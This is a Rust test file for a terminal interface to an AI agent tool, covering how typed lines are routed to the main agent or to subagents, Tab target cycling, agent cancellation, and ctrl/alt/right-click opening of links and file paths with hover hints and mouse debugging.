fn status(a: &mut App, name: &str, to: &str) {
    let ev = Ev::SubagentStatusChanged {
        agent_id: format!("id-{name}"),
        name: name.into(),
        from: "running".into(),
        to: to.into(),
        reason: None,
    };
    a.on_event(&env(2, ev), T0);
}

#[test]
fn tab_cycles_the_target_and_the_prompt_shows_it() {
    let mut a = app();
    started(&mut a, "w");
    started(&mut a, "v");
    assert!(a.target.is_none());
    keys(&mut a, "\t");
    assert!(
        screen(&mut a).contains("to @w · running"),
        "{}",
        screen(&mut a)
    );
    keys(&mut a, "\t");
    assert!(screen(&mut a).contains("@v · running"));
    keys(&mut a, "\t");
    assert!(a.target.is_none());
}

#[test]
fn lines_follow_the_address_and_the_task_state() {
    let mut a = app();
    started(&mut a, "w");
    status(&mut a, "w", "idle");
    // idle agent, no task: a task driven by that agent
    let c = typed_at(&mut a, "w do it\r");
    assert!(
        matches!(&c[..], [Cmd::StartTask { text, agent: Some(TaskAgent::Existing(n)), .. }] if text == "do it" && n == "w"),
        "{c:?}"
    );
    // a task runs: lines go to the inbox of main or of the agent
    let mut a = app();
    started(&mut a, "w");
    keys(&mut a, "first\r");
    let c = keys(&mut a, "more\r");
    assert!(
        matches!(&c[..], [Cmd::SendTo { to, text }] if to == "main" && text == "more"),
        "{c:?}"
    );
    let c = typed_at(&mut a, "w and this\r");
    assert!(
        matches!(&c[..], [Cmd::SendTo { to, text }] if to == "w" && text == "and this"),
        "{c:?}"
    );
    // a file mention is not routed
    let c = typed_at(&mut a, "README.md hi\r");
    assert!(
        matches!(&c[..], [Cmd::SendTo { to, .. }] if to == "main"),
        "{c:?}"
    );
    // Esc with a background target cancels that agent only
    keys(&mut a, "\t");
    let c = keys(&mut a, "\x1b");
    assert!(matches!(&c[..], [Cmd::CancelAgent(n)] if n == "w"), "{c:?}");
    // @agent:<type> while a task runs waits in the queue
    let c = typed_at(&mut a, "agent:reviewer look\r");
    assert!(c.is_empty());
}

#[test]
fn agent_start_and_unknown_addresses() {
    let mut a = app();
    let c = typed_at(&mut a, "agent:reviewer look\r");
    assert!(
        matches!(&c[..], [Cmd::StartTask { agent: Some(TaskAgent::New(d)), text, .. }] if d == "reviewer" && text == "look"),
        "{c:?}"
    );
    let mut a = app();
    assert!(typed_at(&mut a, "agent:zzz hi\r").is_empty());
    assert!(screen(&mut a).contains("no such agent"));
}

fn press(a: &mut App, (x, y): (u32, u32), button: u32, ctrl: bool, alt: bool) -> Vec<Cmd> {
    a.on_key(
        Key::Mouse {
            x: x + 1,
            y: y + 1,
            button,
            action: MouseAction::Down,
            mods: Mods {
                ctrl,
                alt,
                shift: false,
            },
        },
        T0,
    )
}

fn notice(a: &mut App, text: &str) {
    a.on_event(
        &env(
            40,
            Ev::ModelDelta {
                block_index: 1,
                kind: "text".into(),
                text: text.into(),
            },
        ),
        T0,
    );
}

#[test]
fn click_gestures_open_links_relative_paths_and_report_missing_ones() {
    let d = tempfile::tempdir().unwrap();
    let root = synthesis_core::canonicalize(d.path()).unwrap();
    std::fs::write(root.join("notes.txt"), "x").unwrap();
    let mut a = App::new(cfg(&root.to_string_lossy()), &[], T0);
    streamed(&mut a);
    notice(
        &mut a,
        "see https://example.com/x then Update(notes.txt:3) or gone/away.rs ok",
    );
    let url = find_cell(&mut a, "https://example.com/x", 3);
    let rel = find_cell(&mut a, "notes.txt:3", 2);
    let gone = find_cell(&mut a, "gone/away.rs", 2);
    let is_url =
        |c: &[Cmd]| matches!(c, [Cmd::Open(OpenTarget::Url(u))] if u == "https://example.com/x");
    let is_file = |c: &[Cmd]| matches!(c, [Cmd::Open(OpenTarget::RevealFile(p))] if *p == root.join("notes.txt"));
    // (button, ctrl, alt) that open: ctrl+left, alt+left, any right click (macOS ctrl+click)
    for (button, ctrl, alt) in [
        (0, true, false),
        (0, false, true),
        (2, false, false),
        (2, true, false),
    ] {
        assert!(
            is_url(&press(&mut a, url, button, ctrl, alt)),
            "{button} {ctrl} {alt}"
        );
        assert!(
            is_file(&press(&mut a, rel, button, ctrl, alt)),
            "{button} {ctrl} {alt}"
        );
    }
    // a plain left click and a middle click never open
    assert!(press(&mut a, url, 0, false, false).is_empty());
    assert!(press(&mut a, url, 1, true, false).is_empty());
    // a path that does not exist: a notice with ctrl / right click, nothing opened
    assert!(press(&mut a, gone, 0, true, false).is_empty());
    assert!(
        screen(&mut a).contains("✗ not found gone/away.rs"),
        "{}",
        screen(&mut a)
    );
    // alt+click on such text stays a selection click (no notice, no open)
    a.toast("", T0, false);
    assert!(press(&mut a, gone, 0, false, true).is_empty());
    assert!(!screen(&mut a).contains("not found"));
}

#[test]
fn a_url_wrapped_over_rows_opens_from_any_row_and_hover_hints() {
    let mut a = app();
    streamed(&mut a);
    let url = format!("https://example.com/{}", "a".repeat(150));
    notice(&mut a, &format!("see {url} end"));
    let (x, y) = find_cell(&mut a, "https://example.com/", 3);
    for dy in [0, 1] {
        let c = press(&mut a, (x, y + dy), 0, true, false);
        assert!(
            matches!(&c[..], [Cmd::Open(OpenTarget::Url(u))] if *u == url),
            "row +{dy}: {c:?}"
        );
    }
    // motion without a button over the link hints, over plain text does not
    let motion = |a: &mut App, x: u32, y: u32| {
        a.on_key(
            Key::MouseDrag {
                x: x + 1,
                y: y + 1,
                button: 3,
                mods: Mods::default(),
            },
            T0,
        )
    };
    motion(&mut a, x, 0);
    assert!(!screen(&mut a).contains("ctrl+click to open"));
    motion(&mut a, x, y);
    assert!(screen(&mut a).contains("ctrl+click to open"));
}

#[test]
fn mouse_debug_shows_what_the_terminal_sent() {
    let mut c = cfg("/tmp/proj");
    c.mouse_debug = true;
    let mut a = App::new(c, &[], T0);
    streamed(&mut a);
    press(&mut a, (5, 5), 2, false, false);
    assert!(
        screen(&mut a).contains("mouse Down button=2 ctrl=false alt=false shift=false @6,6"),
        "{}",
        screen(&mut a)
    );
}
